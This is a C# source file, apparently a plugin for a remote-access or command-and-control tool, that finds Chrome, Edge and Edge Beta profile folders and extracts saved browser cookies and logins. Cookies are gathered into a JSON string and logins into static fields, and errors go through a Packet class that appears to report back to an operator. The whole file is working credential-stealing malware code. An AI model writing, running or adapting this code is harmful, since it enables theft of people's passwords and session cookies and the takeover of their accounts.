using System;
using System.Data;
using System.Collections;
using System.Collections.Generic;
using System.Threading;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Security.Principal;
using System.IO;
using System.Reflection;

namespace Plugin
{
    using CS_SQLite3;
    class Recorvery
    {
        public static string his = "";
        public static string login0 = "";
        public static string totalResults = "";
        public static string totallogins = "";
        public static string totalhistories = "";
        public static void Recorver()
        {
            // Path builder for Chrome install location
            string homeDrive = System.Environment.GetEnvironmentVariable("HOMEDRIVE");
            string homePath = System.Environment.GetEnvironmentVariable("HOMEPATH");
            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");

            string[] paths = new string[3];
            //paths[0] = homeDrive + homePath + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\";
            paths[0] = localAppData + "\\Google\\Chrome\\User Data\\";
            paths[1] = localAppData + "\\Microsoft\\Edge\\User Data\\";
            paths[2] = localAppData + "\\Microsoft\\Edge Beta\\User Data\\";
            //string chromeLoginDataPath = "C:\\Users\\Dwight\\Desktop\\Login Data";


            foreach (string path in paths)
            {
                if (Directory.Exists(path))
                {
                    string browser = "";
                    string fmtString = "[*] {0} {1} extraction.\n";
                    if (path.ToLower().Contains("chrome"))
                    {
                        browser = "Google Chrome";
                    } else if (path.ToLower().Contains("edge beta"))
                    {
                        browser = "Edge Beta";
                    } else
                    {
                        browser = "Edge";
                    }
                    Console.WriteLine(string.Format(fmtString, "Beginning", browser));
                    // do something
                    ExtractData(path, browser);
                    Console.WriteLine(string.Format(fmtString, "Finished", browser));
                }
            }

            Console.WriteLine("[*] Done.");

        }

        static void ExtractData(string path, string browser)
        {
            ChromiumCredentialManager chromeManager = new ChromiumCredentialManager(path);
            try
            {
                //getCookies
                var cookies = chromeManager.GetCookies();
                foreach (var cookie in cookies)
                {
                    string jsonArray = cookie.ToJSON();
                    string jsonItems = jsonArray.Trim(new char[] { '[', ']', '\n' });
                    totalResults += jsonItems + ",\n";
                }
                totalResults = totalResults.Trim(new char[] { ',', '\n' });
                totalResults = "[" + totalResults + "]";

                //getLogins
                var logins = chromeManager.GetSavedLogins();
                foreach (var login in logins)
                {
                    login.Print();
                }
                totallogins = login0;


            }
            catch (Exception ex)
            {
                Packet.Error("[X] Exception: " + ex.Message + ex.StackTrace);
            }
        }
    }
}
